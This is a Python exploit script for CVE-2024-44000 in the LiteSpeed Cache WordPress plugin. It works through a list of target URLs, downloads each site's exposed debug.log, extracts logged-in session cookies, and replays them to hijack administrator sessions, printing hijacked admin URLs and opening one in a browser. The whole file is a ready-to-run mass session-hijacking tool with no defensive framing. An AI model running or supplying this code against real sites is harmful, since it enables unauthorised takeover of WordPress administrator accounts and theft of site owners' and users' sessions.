import requests
import re
import argparse
from urllib.parse import urljoin, quote
import tempfile
import webbrowser

def extract_cookies(log_file):
    cookies = []
    with open(log_file, 'r') as f:
        for line in f:
            match = re.search(r'Cookie: (.*)', line)
            if match:
                cookies.append(match.group(1))
    return cookies

def extract_session_cookies(cookies):
    session_cookies = []
    for cookie in cookies:
        match = re.search(r'wordpress_logged_in_[^=]+=[^;]+', cookie)
        if match:
            session_cookies.append(match.group(0))
    return session_cookies

def extract_and_use_cookies(url):
    session = requests.Session()
    log_url = urljoin(url, "wp-content/debug.log")
    try:
        response = session.get(log_url, allow_redirects=False, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Successfully accessed the debug log file for {url}")
            
            with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False) as tmp:
                tmp.write(response.text)
                log_file = tmp.name
            
            cookies = extract_cookies(log_file)
            session_cookies = extract_session_cookies(cookies)
            
            if session_cookies:
                result = f"[+] Found session cookies for {url}:\n"
                for cookie in session_cookies:
                    result += f"    {cookie}\n"
                
                for admin_cookie in session_cookies:
                    cookie_name, cookie_value = admin_cookie.split('=')
                    session.cookies.set(cookie_name, cookie_value)
                    admin_url = urljoin(url, "wp-admin/")
                    admin_response = session.get(admin_url, allow_redirects=False)
                    
                    if admin_response.status_code == 302 and 'wp-admin' in admin_response.headers.get('Location', ''):
                        hijacked_url = f"{urljoin(url, 'wp-login.php')}?redirect_to={quote(admin_url + f'?{cookie_name}={cookie_value}')}&reauth=1"
                        result += f"[+] Successfully hijacked admin session with cookie: {admin_cookie}\n"
                        result += f"[+] Hijacked admin session URL: {hijacked_url}\n"
                        result += f"[+] Cookie set URL: {urljoin(url, 'wp-login.php')}?cookie={cookie_name}={cookie_value}\n"

                        # Open the cookie set URL in the default browser
                        webbrowser.open(urljoin(url, 'wp-login.php') + f"?cookie={cookie_name}={cookie_value}")
                        return result
                    else:
                        result += f"[-] Failed to hijack admin session with cookie: {admin_cookie}\n"
            else:
                result = f"[-] No session cookies found in the log file for {url}\n"
        else:
            result = f"[-] Failed to access the debug log file for {url}. Status code: {response.status_code}\n"
    except requests.RequestException as e:
        result = f"[-] Error occurred while accessing the target {url}: {e}\n"
    
    return result

def process_urls(file_path):
    with open(file_path, 'r') as f:
        urls = f.read().splitlines()
    
    results = []
    for url in urls:
        if url:
            result = extract_and_use_cookies(url)
            results.append(result)
    
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LiteSpeed Cache Cookie Extractor and Admin Login (CVE-2024-44000)")
    parser.add_argument("-f", "--file", help="Path to the file containing list of URLs", default="list.txt")
    parser.add_argument("-o", "--output", help="File to save the results", default="result.txt")
    args = parser.parse_args()

    # Process URLs from the specified file
    results = process_urls(args.file)
    
    # Save the results to the output file
    with open(args.output, 'w') as f:
        f.write("\n".join(results))
    
    print(f"[+] Results saved to {args.output}")

